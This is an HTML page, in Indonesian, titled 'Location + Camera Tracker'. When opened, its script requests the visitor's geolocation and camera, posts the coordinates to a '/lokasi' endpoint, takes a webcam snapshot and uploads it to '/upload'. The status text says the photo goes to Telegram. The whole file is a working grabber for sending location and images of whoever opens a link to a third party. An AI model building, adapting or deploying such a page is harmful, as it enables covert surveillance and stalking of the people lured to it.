<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Location + Camera Tracker</title>
  </head>
  <body style="font-family: Arial; text-align:center; padding:20px">
    <h2>🌍 Akses Lokasi & Kamera</h2>
    <p id="status">Meminta izin lokasi dan kamera...</p>
    <video id="preview" autoplay playsinline style="width:80%; border-radius:10px; display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
      async function kirimLokasi(lat, lon, acc) {
        await fetch("/lokasi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc }),
        });
      }

      async function kirimFoto(blob) {
        const formData = new FormData();
        formData.append("photo", blob, "snapshot.jpg");
        await fetch("/upload", { method: "POST", body: formData });
      }

      async function init() {
        const status = document.getElementById("status");
        const video = document.getElementById("preview");
        const canvas = document.getElementById("canvas");

        try {
          // Minta izin lokasi
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              const { latitude, longitude, accuracy } = pos.coords;
              status.innerText = `✅ Lokasi dikirim: ${latitude}, ${longitude}`;
              await kirimLokasi(latitude, longitude, accuracy);
            },
            (err) => {
              status.innerText = "❌ Gagal ambil lokasi: " + err.message;
            }
          );

          // Minta izin kamera
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;
          video.style.display = "block";

          // Tunggu kamera siap
          await new Promise((res) => (video.onloadedmetadata = res));

          // Ambil snapshot
          const ctx = canvas.getContext("2d");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg"));
          await kirimFoto(blob);

          status.innerText += "\n📸 Foto dikirim ke Telegram!";
        } catch (err) {
          status.innerText = "❌ Akses kamera ditolak / error: " + err.message;
        }
      }

      init();
    </script>
  </body>
</html>
